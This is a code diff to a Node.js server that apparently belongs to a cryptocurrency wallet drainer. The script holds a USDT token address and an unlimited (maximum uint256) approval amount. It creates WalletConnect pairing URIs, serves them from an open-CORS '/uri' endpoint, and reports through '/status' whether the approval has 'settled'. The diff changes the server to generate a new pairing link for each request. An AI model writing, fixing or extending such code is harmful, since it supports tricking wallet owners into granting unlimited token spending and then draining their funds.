@@ -11,7 +11,6 @@ const TOKEN = '0x55d398326f99059fF775485246999027B3197955';
 const AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
 let wallet;
-let currentUri = '';
 let settled = false;
 
 async function init() {
@@ -61,17 +60,21 @@ async function init() {
         } catch (_) {}
     });
 
-    const { uri } = await wallet.core.pairing.create();
-    currentUri = uri;
-    console.log('URI ready');
+    console.log('Wallet initialized');
 }
 
-const server = http.createServer((req, res) => {
+const server = http.createServer(async (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     
     if (req.url === '/uri') {
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ uri: currentUri }));
+        try {
+            const { uri } = await wallet.core.pairing.create();
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ uri }));
+        } catch (e) {
+            res.writeHead(500, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ error: e.message }));
+        }
     } else if (req.url === '/status') {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ settled }));
